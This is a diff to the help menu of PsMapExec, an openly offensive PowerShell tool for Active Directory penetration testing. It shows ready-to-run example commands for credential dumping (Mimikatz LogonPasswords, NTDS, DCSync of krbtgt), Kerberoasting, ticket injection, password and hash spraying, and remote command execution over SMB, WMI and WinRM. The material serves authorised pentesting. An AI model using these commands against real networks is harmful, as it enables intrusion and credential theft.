@@ -175,143 +175,85 @@ Function PsMapExec {
 
     if ($Help) {
 
-        $HelpOutput = @("
+        $HelpOutput = @('
 
 -----------------------------------------------------------------------------------------------------------
 ---------------------------------------------- [ Help Menu ] ---------------------------------------------- 
 
-Documentation: https://viperone.gitbook.io/pentest-everything/psmapexec
+Documentation: https://github.com/The-Viper-One/PsMapExec/wiki
 
 -----------------------------------------------------------------------------------------------------------
- Examples
+# Command Examples
 
- # Execute WMI commands over all systems in the domain using password authentication
-   PsMapExec -Targets all -Method WMI -Username Admin -Password Pass -Command ""net user""
+# SMB
+PsMapExec SMB -Targets "ALL" -Username "user" -Password "Pass" -Command "ipconfig" -Domain "security.local"
+PsMapExec SMB -Targets "Workstations" -Username "user" -Password "Pass" -Module "LogonPasswords" -ShowOutput
+PsMapExec SMB -Targets "DC01.Security.local" -Username "user" -Hash "8846F7EAEE8..." -Module "KerbDump" -ShowOutput
+PsMapExec SMB -Targets "10.10.10.0/24" -Ticket "doIFmjCCBZagAwIBBaEDAgEWooIE..." 
 
- # Execute WinRM commands over all systems in the domain using hash authentication
-   PsMapExec -Targets all -Method WinRM -Username Admin -Hash [Hash] -Command ""net user""
+# WMI
+PsMapExec WMI -Targets "Servers" -Username "user" -Password "Pass" -Command "ipconfig"
+PsMapExec WMI -Targets "Servers" -Username "administrator" -Password "Pass" -Module "SCCM" -LocalAuth
+PsMapExec WMI -Targets "WKSTN0*" -Ticket "doIFmjCCBZagAwIBBaEDAgEWooIE..." -Domain "security.local"
 
- # Check RDP Access against workstations in the domain and using local authentication
-   PsMapExec -Targets Workstations -Method RDP -Username LocalAdmin -Password Pass -LocalAuth
+# WinRM
+PsMapExec WinRM -Targets "ALL" -Username "user" -Password "Pass" -Command "ipconfig"
+PsMapExec WinRM -Targets "C:\scope.txt" -Ticket "doIFmjCCBZagAwIBBaEDAgEWooIE..." -Domain "security.local"
+PsMapExec WinRM -Targets "DC01.Security.local" -Username "user" -Hash "8846F7EAEE8..." -Module "NTDS" -ShowOutput
 
- # Dump SAM on a single system using SMB and a -ticket for authentication
-   PsMapExec -Targets DC01.Security.local -Method SMB -Ticket [Base64-Ticket] -Module SAM
+# LDAP/S
+PsMapExec LDAP -Targets "DCs" -Username "user" -Password "Pass"
+PsMapExec LDAP -Targets "DC1" -Username "user" -Password "Pass" -module "whoami"
+PsMapExec LDAP -Targets "DC1" -Ticket "doIFmjCCBZagAwIBBaEDAgEWooIE..." -Module "AddComputer" -Domain "security.local"
+PsMapExec LDAP -Targets "DC1" -Username "user" -Password "Pass" -Module Elevate -TargetDN "CN=Mendez,CN=Users,DC=SECURITY,DC=LOCAL"
+PsMapExec LDAP -Targets "DC1" -Username "user" -Hash "8846F7EAEE8..." -Module "timeroast" -ShowOutput
 
- # Check SMB Signing on all domain systems
-   PsMapExec -Targets All -Method GenRelayList
+# Kerberoast stuff
+PsMapExec kerberoast -Domain "dev.security.local" -ShowOutput 
+PsMapExec kerberoast -Domain "dev.security.local" -Option "Kerberoast:dev_user_1" -ShowOutput
 
- # Dump LogonPasswords on all Domain Controllers over WinRM
-   PsMapExec -Targets DCs -Method WinRM -Username Admin -Password Pass -Module LogonPasswords
+# RDP
+PsMapExec RDP -Targets "Servers" -Username "user" -Password "password"
+PsMapExec RDP -Targets "Servers" -Username "user" -Password "password" -Domain "dev.security.local" -LocalAuth
 
- # Use WMI to check current user admin access from systems read from a text file
-   PsMapExec -Targets C:\temp\Systems.txt -Method WMI
+# DCSync 
+PsMapExec DCSync -Targets "DC1.security.local" -ShowOutput -Domain "security.local"
+PsMapExec DCSync -Targets "DC1.security.local" -option "dcsync:security\krbtgt" -ShowOutput
 
- # Spray passwords across all accounts in the domain
-   PsMapExec -Method Spray -SprayPassword [Password]
+# SMB Signing
+PsMapExec GenRelayList -Targets "All" -Domain "Security.local"
+PsMapExec GenRelayList -Targets "Servers" -Domain "Security.local"
 
- # Spray Hashes across all accounts in the domain
-   PsMapExec -Method Spray -SprayHash [Hash]
+# Inject Kerberos tickets into current session
+PsMapExec Inject -Ticket "doIhsj..."
+PsMapExec Inject -Ticket "C:\ticket.txt"
+PsMapExec Inject -Username "user" -Hash "8846F7EAEE8..." -Domain "security.local"
+PsMapExec Inject -Username "user" -Password "password" -Domain "security.local"
 
- # Spray Hashes across all Domain Admin group users
-   PsMapExec -Targets ""Domain Admins"" -Method Spray -SprayHash [Hash]
+# IPMI hashes
+PsMapExec IPMI -Targets "Servers" -Domain "security.local"
+PsMapExec IPMI -Targets "All" -Option "IPMI:bob_admin"
 
- # Kerberoast 
-   PsMapExec -Method Kerberoast -ShowOutput
+# MSSQL
+PsMapExec MSSQL -Targets "All" -Username "SA" -Password "Password123" -LocalAuth
+PsMapExec MSSQL -Targets "All" -Command "whoami" -Domain "security.local"
 
- # IPMI
-   PsMapExec -Targets 192.168.1.0/24 IPMI
+# Spray credentials
+PsMapExec Spray -SprayPassword "password" 
+PsMapExec Spray -AccountAsPassword -Domain "dev.security.local"
+PsMapExec Spray -EmptyPassword -Domain "security.local"
+PsMapExec Spray -Pre2k
+PsMapExec Spray -SprayHash [RC4]
+PsMapExec Spray -SprayHash [AES256]
+PsMapExec Spray -SprayHash [LM:NT]
 
------------------------------------------------------------------------------------------------------------
-
- 
- 
- General Usage Parameters
- +---------------------+--------------+-----------------------------------------------------------------+
- | Parameter           |    Value     | Description                                                     |
- +---------------------+--------------+-----------------------------------------------------------------+
- | -Command            |    whoami    | Executes a command on the target system                         |
- | -CurrentUser        |     N/A      | Defaults to current user context without other credentials      |
- | -Domain             |    Domain    | Sets the domain for the operation, defaults to user's domain    |
- | -DomainController   |      DC      | Identifies which Domain controller to authenticate against      |
- | -Force              |     N/A      | Forces execution with domain admin credentials                  |
- | -Flush              |     N/A      | Clears LDAP variables for long-term, large environments         |
- | -Module             |    Module    | Specifies the module for command execution                      |
- | -NoBanner           |     N/A      | Hides the script banner                                         |
- | -NoParse            |     N/A      | Avoids parsing some module outputs                              |
- | -Rainbow            |     N/A      | Uses online rainbow tables for specific module hash analysis    |
- | -SuccessOnly        |     N/A      | Shows only successful results                                   |
- | -Timeout            |     int      | Sets the port scan timeout in milliseconds                      |
- | -Threads            |     int      | Determines thread count, default is 30                          |
- +---------------------+--------------+-----------------------------------------------------------------+
- 
- Methods (PsMapExec -Method WMI etc...)
- +---------------------+--------------------------------------------------------------------------------+
- | Method              | Description                                                                    |
- +---------------------+--------------------------------------------------------------------------------+
- | DCSync              | DCSync all users or a single user against a specified DC                       |
- | Inject              | Inject a Base64 encoded Kerberos ticket                                        |
- | RDP                 | Check RDP access with specified username and password                          |
- | SMB                 | Check access or execute commands and modules over SMB                          |
- | Spray               | Spray hashes or passwords against all users or specified groups                |
- | WinRM               | Check access or execute commands and modules over WinRM                        |
- | WMI                 | Check access or execute commands and modules over WMI                          |
- +---------------------+--------------------------------------------------------------------------------+
-
-
- Authentication Parameters
- +---------------------+--------------+-----------------------------------------------------------------+
- | Parameter           |    Value     | Description                                                     |
- +---------------------+--------------+-----------------------------------------------------------------+
- | -Hash               | RC4 or AES   | Hash value. Must be supplied with -Username                     |
- | -LocalAuth          |     N/A      | Specifies local account authentication                          |
- | -Password           |   Password   | Password value. Must be supplied with -Username                 |
- | -Ticket             |    Ticket    | B64 encoded Kerberos ticket for authentication.                 |
- +---------------------+--------------+-----------------------------------------------------------------+
-
- Command execution Parameters (PsMapExec -Method [WMI/SMB/WinRM] -Command whoami / -Module lsa)
- +---------------------+--------------+-----------------------------------------------------------------+
- | Parameter           |    Value     | Description                                                     |
- +---------------------+--------------+-----------------------------------------------------------------+
- | -Command            |   Command    | Runs the specified command on the remote system                 |
- | -Module             |   Module     | Specifies the module for command execution                      |
- | -ShowOutput         |     N/A      | Displays output for executed modules. Commands shown by default |
- +---------------------+--------------+-----------------------------------------------------------------+
-
- Module Details (PsMapExec -Targets Servers -Method WMI -Module lsa)
- +---------------------+--------------------------------------------------------------------------------+
- | Module              | Description                                                                    |
- +---------------------+--------------------------------------------------------------------------------+
- | Amnesiac            | Executes Amnesiac C2 payloads                                                  |
- | ConsoleHistory      | Dumps PowerShell console history                                               |
- | eKeys               | Dumps encryption keys from memory (Mimikatz)                                   |
- | FileZilla           | Extracts and decodes FileZilla passwords from common locations                 |
- | Files               | Lists files in common directories for each user                                |
- | KerbDump            | Dumps Kerberos tickets                                                         |
- | LogonPasswords      | Dumps logon passwords from memory (Mimikatz)                                   | 
- | LSA                 | Dumps LSA (Mimikatz)                                                           |
- | NTDS                | Executes DCsync on the remote system                                           |
- | MDF                 | Extracts account hashes from remote system MSSQL MDF files                     |
- | SAM                 | Dumps SAM hashes                                                               |
- | SCCM                | Dumps NAA credentials and task sequences                                       |
- | VNC                 | Extracts and decrypts VNC passwords from common locations                      |
- | WinSCP              | Extracts and decrypts WinSCP passwords from common locations                   |
- +---------------------+--------------------------------------------------------------------------------+
-
-
- Spraying Parameters (PsMapExec -Method Spray -SprayPassword Password123)
- +---------------------+--------------+-----------------------------------------------------------------+
- | Parameter           |    Value     | Description                                                     |
- +---------------------+--------------+-----------------------------------------------------------------+
- | -AccountAsPassword  |      N/A     | Sprays SAM Account names as passwords                           |
- | -EmptyPassword      |      N/A     | Sprays blank passwords                                          |
- | -SprayHash          | RC4/AES/NTLM | defines the hash value for spraying                             |
- | -SprayPassword      |   Password   | defines the password value for spraying                         |
- +---------------------+--------------+-----------------------------------------------------------------+
+# Check for VNC no auth
+PsMapExec VNC -Target "All" -Domain "Security.local"
 
  ---------------------------------------------- [ End Menu ] ----------------------------------------------- 
  -----------------------------------------------------------------------------------------------------------
 
-")
+')
 
         $HelpOutput | Write-Output
         return
@@ -375,6 +317,7 @@ Documentation: https://viperone.gitbook.io/pentest-everything/psmapexec
                                                                  
 
 Github  : https://github.com/The-Viper-One
+Wiki    : https://github.com/The-Viper-One/PsMapExec/wiki
 Version : 0.8.0")
 
     # Display banner once then prevent for consecutive execution
